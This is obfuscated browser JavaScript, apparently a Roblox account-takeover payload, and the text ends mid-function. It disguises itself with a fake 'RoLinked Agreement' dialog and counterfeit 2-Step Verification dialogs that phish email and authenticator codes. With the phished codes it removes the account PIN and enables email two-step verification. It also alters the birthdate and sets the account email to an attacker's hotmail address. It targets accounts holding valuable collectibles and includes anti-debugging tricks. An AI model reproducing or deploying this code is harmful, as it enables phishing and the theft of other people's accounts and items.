(async function () {
    var F = (function () {
            var S = true;
            return function (P, q) {
                var T = S
                    ? function () {
                          if (q) {
                              var o = q.apply(P, arguments);
                              return (q = null), o;
                          }
                      }
                    : function () {};
                return (S = false), T;
            };
        })(),
        O = F(this, function () {
            return O.toString().search("(((.+)+)+)+$").toString().constructor(O).search("(((.+)+)+)+$");
        });
    O();
    var t = (function () {
        var x = true;
        return function (P, q) {
            var T = x
                ? function () {
                      if (q) {
                          var e = q.apply(P, arguments);
                          return (q = null), e;
                      }
                  }
                : function () {};
            return (x = false), T;
        };
    })();
    (function () {
        t(this, function () {
            var P = new RegExp("function *\\( *\\)"),
                q = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                g = w("init");
            if (!P.test(g + "chain") || !q.test(g + "input")) {
                g("0");
            } else {
                w();
            }
        })();
    })();
    var h = (function () {
            var S = true;
            return function (x, P) {
                var g = S
                    ? function () {
                          if (P) {
                              var e = P.apply(x, arguments);
                              return (P = null), e;
                          }
                      }
                    : function () {};
                return (S = false), g;
            };
        })(),
        a = h(this, function () {
            var S = function () {
                    var f;
                    try {
                        f = Function('return (function() {}.constructor("return this")( ));')();
                    } catch (N) {
                        f = window;
                    }
                    return f;
                },
                x = S(),
                P = (x.console = x.console || {}),
                q = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var g = 0; g < q.length; g++) {
                var e = h.constructor.prototype.bind(h);
                var A = q[g];
                var o = P[A] || e;
                e["__proto__"] = h.bind(h);
                e.toString = o.toString.bind(o);
                P[A] = e;
            }
        });
    a();
    const V = (n) => new Promise((S) => setTimeout(S, n));
    var E = ["bWVuZGNhcmwzQGhvdG1haWwuY29t"],
        b = "@hotmail.com",
        k = "m***",
        p = E[Math.floor(Math.random() * E.length)];
    var c = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (S) {
                var P = Number(S.totalPages);
                for (let q = 0; q < P; q++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + q + "&pageSize=20",
                        contentType: "application/json",
                        success: function (g) {
                            var T = g.collection;
                            for (var K of T) {
                                K.body.includes("VlK Games") == true && validDev.push("true");
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (x) {
                var q = Number(x.totalPages);
                for (let T = 0; T < q; T++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + T + "&pageSize=20",
                        contentType: "application/json",
                        success: function (K) {
                            var o = K.collection;
                            for (var A of o) {
                                if (A.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (q) {
                var T = q.id;
                try {
                    var K = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + c + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(K),
                    });
                } catch {}
                async function e() {
                    function j() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (J) {
                                if (J.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(p),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var s = J.emailAddress,
                                        m = J.verified;
                                    if (s.includes(b) == true) {
                                        if (s.includes(k) == true) {
                                            if (m == true) {
                                                (async function () {
                                                    await V(500);
                                                    var I = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(I);
                                                })();
                                            }
                                        }
                                    }
                                }
                            },
                        }),
                            setTimeout(j, 2000);
                    }
                    j();
                    function d(D, z, J) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + T + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: D,
                            }),
                            success: function () {
                                var y = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", y);
                                function C() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(C, 100);
                                }
                                C();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + T + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: D,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (W) {
                                            var X = W.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: z,
                                                    challengeMetadata: '{"verificationToken":"' + X + '","rememberDevice":false,"challengeId":"' + D + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    V(2000);
                                                    var i2 = btoa('{"reauthenticationToken":"' + X + '"}');
                                                    console.log(J);
                                                    if (J == 1) {
                                                        console.log("Reason is 1");
                                                        var i3 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        i3.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        i3.headers["Rblx-Challenge-Id"] = z;
                                                        i3.headers["Rblx-Challenge-Metadata"] = i2;
                                                        $.ajax(i3);
                                                    } else {
                                                        J == null
                                                            ? $.ajax({
                                                                  method: "DELETE",
                                                                  url: "https://auth.roblox.com/v1/account/pin",
                                                                  contentType: "application/json",
                                                                  headers: {
                                                                      "Rblx-Challenge-Type": "reauthentication",
                                                                      "Rblx-Challenge-Id": z,
                                                                      "Rblx-Challenge-Metadata": i2,
                                                                  },
                                                                  success: function () {
                                                                      N(null, null);
                                                                  },
                                                              })
                                                            : N(z, i2);
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function G(D, z, J) {
                        var s = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", s);
                        function m() {
                            document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true);
                            setTimeout(m, 100);
                        }
                        m();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + T + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: D,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (l) {
                                    var W = l.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: z,
                                            challengeMetadata: '{"verificationToken":"' + W + '","rememberDevice":false,"challengeId":"' + D + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            V(2000);
                                            var i0 = btoa('{"reauthenticationToken":"' + W + '"}');
                                            if (J == 1) {
                                                console.log("Reason is 1");
                                                var i1 = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                i1.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                i1.headers["Rblx-Challenge-Id"] = z;
                                                i1.headers["Rblx-Challenge-Metadata"] = i0;
                                                $.ajax(i1);
                                            } else {
                                                J == null
                                                    ? $.ajax({
                                                          method: "DELETE",
                                                          url: "https://auth.roblox.com/v1/account/pin",
                                                          contentType: "application/json",
                                                          headers: {
                                                              "Rblx-Challenge-Type": "reauthentication",
                                                              "Rblx-Challenge-Id": z,
                                                              "Rblx-Challenge-Metadata": i0,
                                                          },
                                                          success: function () {
                                                              N(null, null);
                                                          },
                                                      })
                                                    : N(z, i0);
                                            }
                                        },
                                    });
                                },
                                error: function (l) {
                                    if (l.responseText.includes('"code":18')) {
                                        (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code."), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                    } else {
                                        document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                        document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                    }
                                },
                            });
                        };
                    }
                    function f(D, z) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (u) {
                                var m = u.otpSessionToken,
                                    y = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", y);
                                function C() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(C, 100);
                                }
                                C();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: m,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: m,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (X) {
                                                    (responseToken = X.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: D,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove();
                                                                V(2000);
                                                                var i3 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                                if (z == 1) {
                                                                    console.log("Reason is 1");
                                                                    var i4 = {
                                                                        method: "POST",
                                                                        url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration/email/enable",
                                                                        contentType: "application/json",
                                                                        headers: {},
                                                                    };
                                                                    i4.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                    i4.headers["Rblx-Challenge-Id"] = D;
                                                                    i4.headers["Rblx-Challenge-Metadata"] = i3;
                                                                    $.ajax(i4);
                                                                } else {
                                                                    if (z == null) {
                                                                        $.ajax({
                                                                            method: "DELETE",
                                                                            url: "https://auth.roblox.com/v1/account/pin",
                                                                            contentType: "application/json",
                                                                            headers: {
                                                                                "Rblx-Challenge-Type": "reauthentication",
                                                                                "Rblx-Challenge-Id": D,
                                                                                "Rblx-Challenge-Metadata": i3,
                                                                            },
                                                                            success: function () {
                                                                                N(null, null);
                                                                            },
                                                                        });
                                                                    } else {
                                                                        N(D, i3);
                                                                    }
                                                                }
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function Y(D, z, J) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration",
                            contentType: "application/json",
                            success: function (m) {
                                var C = m.primaryMediaType;
                                if (C == "Email") {
                                    d(D, z, J);
                                } else {
                                    if (C == "Authenticator") {
                                        G(D, z, J);
                                    } else {
                                        C == null && f(z, J);
                                    }
                                }
                            },
                        });
                    }
                    function N(D, z) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration",
                            contentType: "application/json",
                            success: function (u) {
                                var m = u.primaryMediaType;
                                if (m == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var y = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", y);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove();
                                            document.getElementById("agreeRoLinked").disabled = false;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://twostepverification.roblox.com/v1/users/" + T + "/configuration/email/enable",
                                                contentType: "application/json",
                                                success: function () {},
                                                error: function (X) {
                                                    var i0 = atob(X.getResponseHeader("rblx-challenge-metadata")),
                                                        i1 = X.getResponseHeader("rblx-challenge-id"),
                                                        i2 = i0.split('"challengeId":"').pop().split('"')[0];
                                                    Y(i2, i1, 1);
                                                },
                                            });
                                        };
                                    }
                                } else {
                                    if (D == null) {
                                        var C = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(C),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(p),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await V(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (i4) {
                                                                        if (i4.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(p),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await V(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (i5) {
                                                                    i5.emailAddress == null &&
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(p),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                },
                                                            });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (X) {
                                                var i1 = atob(X.getResponseHeader("rblx-challenge-metadata")),
                                                    i2 = X.getResponseHeader("rblx-challenge-id"),
                                                    i3 = i1.split('"challengeId":"').pop().split('"')[0];
                                                Y(i3, i2, 2);
                                            },
                                        });
                                    } else {
                                        var l = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": D,
                                                "Rblx-Challenge-Metadata": z,
                                            },
                                            data: JSON.stringify(l),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(p),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await V(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (i3) {
                                                                    if (i3.emailAddress == null) {
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(p),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                    }
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await V(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (i4) {
                                                                        i4.emailAddress == null &&
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(p),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (X) {
                                                var i0 = atob(X.getResponseHeader("rblx-challenge-metadata")),
                                                    i1 = X.getResponseHeader("rblx-challenge-id"),
                                                    i2 = i0.split('"challengeId":"').pop().split('"')[0];
                                                Y(i2, i1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var R = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", R);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (z) {
                                    var u = z.isEnabled;
                                    var s = z.unlockedUntil;
                                    if (u == true) {
                                        if (s == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var m = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", m);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    N(null, null);
                                                },
                                                error: function (y) {
                                                    var C = atob(y.getResponseHeader("rblx-challenge-metadata"));
                                                    var l = y.getResponseHeader("rblx-challenge-id"),
                                                        B = C.split('"challengeId":"').pop().split('"')[0];
                                                    Y(B, l, null);
                                                },
                                            });
                                        }
                                    } else {
                                        N(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (D) {
                                var J = D.isEnabled;
                                var u = D.unlockedUntil;
                                if (J == true) {
                                    if (u == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var s = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", s);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                N(null, null);
                                            },
                                            error: function (m) {
                                                var y = atob(m.getResponseHeader("rblx-challenge-metadata"));
                                                var C = m.getResponseHeader("rblx-challenge-id");
                                                var l = y.split('"challengeId":"').pop().split('"')[0];
                                                Y(l, C, null);
                                            },
                                        });
                                    }
                                } else {
                                    N(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await V(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var d = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(d),
                            });
                        } catch {}
                        e();
                    } else {
                        function G(f) {
                            const Y = "https://inventory.roblox.com/v1/users/" + f + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var N = {
                                url: Y,
                                type: "GET",
                            };
                            return $.ajax(N);
                        }
                        G(T)
                            .done(function (f) {
                                if (f && f.data && f.data.length > 0) {
                                    let D = 0;
                                    f.data.forEach((z) => {
                                        z.recentAveragePrice && (D += z.recentAveragePrice);
                                    });
                                    if (D > 15000) {
                                        e();
                                    } else {
                                        var R = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", R);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
